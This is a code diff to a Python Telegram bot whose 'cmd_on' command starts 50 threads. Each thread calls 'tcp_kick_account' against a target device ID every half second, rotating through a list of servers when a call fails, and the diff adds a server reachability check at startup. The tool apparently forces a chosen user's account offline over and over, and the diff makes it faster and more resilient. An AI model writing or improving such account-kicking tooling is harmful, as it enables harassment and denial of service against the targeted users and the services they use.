@@ -206,9 +206,11 @@ def cmd_on(message):
     threads = []
     def worker(did, c, wid):
         print(f"[DEBUG] worker-{wid} started for '{did[:30]}...'")
+        server_idx = 0
         while not c.is_set():
+            host, port = GLOBAL_SERVERS[server_idx % len(GLOBAL_SERVERS)]
             try:
-                st, r = tcp_kick_account(did, GLOBAL_SERVERS[0][0], GLOBAL_SERVERS[0][1])
+                st, r = tcp_kick_account(did, host, port)
             except Exception as e:
                 print(f"[DEBUG] worker-{wid} EXCEPTION: {e}")
                 st, r = None, str(e)
@@ -216,14 +218,18 @@ def cmd_on(message):
                 if st is True:
                     stats['total_kicks'] += 1
                     if stats['total_kicks'] % 5 == 0:
-                        print(f"[DEBUG] worker-{wid} KICK #5 | total kicks: {stats['total_kicks']} failed: {stats['failed']}")
+                        print(f"[DEBUG] worker-{wid} KICK | total kicks: {stats['total_kicks']} failed: {stats['failed']}")
                 elif st is False:
                     stats['failed'] += 1
-                    print(f"[DEBUG] worker-{wid} FAIL | err={r}")
+                    server_idx += 1
+                    if wid == 0:
+                        print(f"[DEBUG] worker-{wid} FAIL server={host}:{port} err={r}")
                 else:
                     stats['failed'] += 1
-                    print(f"[DEBUG] worker-{wid} ERR/TOCK | st={st} r={r}")
-            c.wait(1)
+                    server_idx += 1
+                    if wid == 0:
+                        print(f"[DEBUG] worker-{wid} TIMEOUT server={host}:{port}")
+            c.wait(0.5)
     for i in range(50):
         t = threading.Thread(target=worker, args=(device_id, cancel, i), daemon=True)
         t.start()
@@ -489,6 +495,19 @@ if __name__ == '__main__':
         print(f"[DEBUG] Users file exists.")
     else:
         print(f"[DEBUG] Users file DOES NOT EXIST")
+
+    print("[DEBUG] Checking server connectivity...")
+    import socket as _sock
+    for _h, _p in GLOBAL_SERVERS:
+        try:
+            _s = _sock.socket(_sock.AF_INET, _sock.SOCK_STREAM)
+            _s.settimeout(5)
+            _s.connect((_h, _p))
+            _s.close()
+            print(f"[DEBUG] Server {_h}:{_p} => REACHABLE")
+        except Exception as _e:
+            print(f"[DEBUG] Server {_h}:{_p} => UNREACHABLE ({_e})")
+
     while True:
         try:
             bot.infinity_polling(none_stop=True, skip_pending=True, timeout=30, long_polling_timeout=30)
